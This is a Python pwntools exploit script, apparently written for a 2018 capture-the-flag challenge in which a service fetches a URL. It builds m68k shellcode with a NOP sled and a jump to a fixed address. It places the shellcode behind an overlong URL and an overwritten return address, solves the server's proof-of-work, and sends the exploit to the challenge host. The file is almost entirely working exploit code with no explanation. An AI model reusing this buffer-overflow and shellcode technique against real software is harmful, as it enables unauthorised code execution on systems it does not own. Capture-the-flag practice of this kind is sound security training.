#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
from pwn import *
from commands import getoutput
context.endian = "big"

sc = ""
sc += "4E 71" * 100         # nop
sc += "20 4F"               # movea.l sp, a0
sc += "4E 56 FE EC"         # link a6, #-276
sc += "D0 FC 01 10"         # add #272, a0
sc += "2F 08"               # move.l a0, -(sp)
sc += "47 F9 04 ff f1 01"   # lea     ($4fff101).l,a3
sc += "D6 FC 40 27"         # adda.w  #0x4027,a3
sc += "4E 93"               # jsr a3
sc = sc.replace(" ", "").decode('hex')

payload = "http://pwnable.tw" + "/".ljust(258, "A")
payload += p32(0x3fff8b8)
payload += sc.ljust(272)
payload += "cat flag flag flag flag flag flag flag flag"
assert "\x00" not in payload

if not args.REMOTE:
    open("payload", "wb").write(payload)
    os.system("uuencode payload payload | nc -llvp 1234")
    exit()

# pow
r = remote("ddee3e1a.quals2018.oooverflow.io", 31337)
r.recvline()
c = r.recvline().split()[1]
n = r.recvline().split()[1]
cmd = "../pow.py %s %s" % (c, n)
log.info(cmd)
sol = getoutput(cmd)
log.success("pow: " + sol)
r.sendlineafter("Solution: \n", sol)

# send exp
os.system("rm -rf *.png")
r.sendlineafter("What URL would you like this old dog to fetch?\n", payload)
count = 1
while True:
    try:
	data = r.recvline()
    except EOFError:
	log.info("Done")
	exit()

    if data.startswith("DEBUG"):
        data = data.split('DEBUG ')[1].decode('base64')
        with open('image_%d.png' % count, 'w+') as fp:
            fp.write(data)
        log.success("image %d saved" % count)
        count += 1
    else:
        log.info(data)

